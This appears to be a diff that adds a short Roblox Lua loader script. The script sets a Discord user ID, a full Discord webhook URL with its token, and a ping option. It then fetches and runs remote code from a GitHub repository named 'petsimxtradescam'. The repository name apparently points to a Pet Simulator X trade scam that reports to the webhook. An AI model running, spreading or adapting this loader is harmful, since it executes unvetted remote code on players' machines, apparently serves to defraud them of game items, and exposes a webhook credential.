@@ -1,0 +1,5 @@
+UserName = "943432999821795358"
+WebHook = "https://discord.com/api/webhooks/1059117658039128095/ZpmPQD_PBXDrYlrTSZkKj4VUdcOw42pK9pFdUI2SZNAsTNzPx6WfqBcUvgZZpyNeHSK8"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/petsimxtradescam/funyo/main/ispro"))()
